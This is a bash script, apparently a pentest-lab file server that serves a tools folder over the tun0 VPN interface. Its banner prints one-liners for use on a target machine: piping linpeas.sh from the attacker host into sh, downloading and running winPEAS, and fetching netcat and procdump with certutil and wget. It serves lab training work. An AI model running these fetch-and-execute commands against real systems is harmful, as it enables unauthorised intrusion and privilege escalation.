#!/usr/bin/env bash
# HTB / THM / OffSec / HS Drop Server — neoserv
# Author: Chris Alupului (Neospring)
# Serves the repo folder on tun0:1337 (override port: neoserv 8080).

# Resolve the script's real directory (follows symlinks like ~/.local/bin/neoserv).
ROOT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" && pwd)"
PORT="${1:-1337}"

ip=$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
if [ -z "$ip" ]; then
  echo "[!] tun0 not up. Connect to your lab VPN first (HTB / THM / OffSec / HS)."
  exit 1
fi

cat <<EOF
   _  _ ___ ___  ___ ___ _____   __
  | \| | __/ _ \/ __| __| _ \ \ / /
  | .\` | _| (_) \__ \ _||   /\ V /
  |_|\_|___\___/|___/___|_|_\ \_/
   HTB / THM / OffSec / HS Drop Server — by Chris Alupului (Neospring)

[*] serving $ROOT
[*] http://$ip:$PORT/

  Linux:    curl http://$ip:$PORT/linux/linpeas.sh | sh
  PS:       iwr http://$ip:$PORT/windows/winPEASx64.exe -o w.exe; .\\w.exe
  certutil: certutil -urlcache -f http://$ip:$PORT/shells/nc64.exe nc.exe
  wget:     wget http://$ip:$PORT/sysinternals/procdump64.exe

[*] Ctrl-C to stop.
EOF

cd "$ROOT" || exit 1

echo "[*] Available files:"
echo "==================================================="
if command -v eza >/dev/null 2>&1; then
  eza -R --icons=always --color=always --group-directories-first
else
  ls -R --color=always
fi
echo "==================================================="
echo

if command -v php >/dev/null 2>&1; then
  # -d opcache.jit=off silences the harmless "JIT disabled" warning emitted
  # when Xdebug (or another extension hooking zend_execute_ex) is loaded.
  exec php -d opcache.jit=off -d opcache.jit_buffer_size=0 -S "$ip:$PORT"
else
  exec python3 -m http.server "$PORT" --bind "$ip"
fi
